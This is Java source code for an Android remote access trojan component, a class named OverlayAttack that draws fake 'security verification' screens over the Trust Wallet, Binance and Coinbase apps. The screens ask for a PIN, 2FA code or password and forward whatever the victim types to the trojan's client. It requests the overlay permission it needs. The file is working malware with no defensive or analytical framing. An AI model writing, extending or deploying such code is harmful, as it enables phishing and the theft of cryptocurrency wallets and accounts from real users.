package com.syshelper.service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.view.Gravity;
import android.view.WindowManager;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Button;
import android.widget.LinearLayout;
import java.util.HashMap;
import java.util.Map;

public class OverlayAttack {
    private final Context ctx;
    private final RatClient client;
    private static WindowManager windowManager;
    private static View overlayView;
    private static final Map<String, OverlayTemplate> OVERLAYS = new HashMap<>();
    static {
        OVERLAYS.put("com.wallet.crypto.trustapp", new OverlayTemplate("Trust Wallet Security", "Enter your PIN", "PIN"));
        OVERLAYS.put("com.binance.dev", new OverlayTemplate("Binance Security", "Enter your 2FA Code", "2FA Code"));
        OVERLAYS.put("com.coinbase.android", new OverlayTemplate("Coinbase Security", "Verify your identity", "Password"));
    }

    public static class OverlayTemplate { String title, subtitle, fieldName; OverlayTemplate(String title, String subtitle, String fieldName) { this.title = title; this.subtitle = subtitle; this.fieldName = fieldName; } }

    public OverlayAttack(Context ctx, RatClient client) { this.ctx = ctx; this.client = client; }

    public boolean canDrawOverlays() { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) return Settings.canDrawOverlays(ctx); return true; }

    public void requestOverlayPermission() {
        if (!canDrawOverlays()) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + ctx.getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); ctx.startActivity(intent);
        }
    }

    public void showOverlay(String targetPkg) {
        if (!canDrawOverlays()) { requestOverlayPermission(); return; }
        OverlayTemplate template = OVERLAYS.get(targetPkg);
        if (template == null) template = new OverlayTemplate("Security Verification", "Please verify", "Password");
        final OverlayTemplate t = template;
        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
            windowManager = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
            int layoutType = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.WRAP_CONTENT, layoutType, WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, PixelFormat.TRANSLUCENT);
            params.gravity = Gravity.CENTER;
            LinearLayout layout = new LinearLayout(ctx); layout.setOrientation(LinearLayout.VERTICAL); layout.setBackgroundColor(0xFFFFFFFF); layout.setPadding(40, 40, 40, 40);
            TextView tv = new TextView(ctx); tv.setText(t.title); tv.setTextSize(18); tv.setTextColor(0xFF000000); layout.addView(tv);
            TextView sv = new TextView(ctx); sv.setText(t.subtitle); sv.setTextSize(14); sv.setTextColor(0xFF666666); layout.addView(sv);
            final EditText input = new EditText(ctx); input.setHint(t.fieldName); layout.addView(input);
            Button btn = new Button(ctx); btn.setText("Verify");
            btn.setOnClickListener(v -> { String c = input.getText().toString(); if (!c.isEmpty()) { client.sendResult("overlay_credential", targetPkg + ":" + c); removeOverlay(); } });
            layout.addView(btn);
            overlayView = layout; windowManager.addView(overlayView, params);
        });
    }

    public void removeOverlay() { if (windowManager != null && overlayView != null) { windowManager.removeView(overlayView); overlayView = null; } }
}
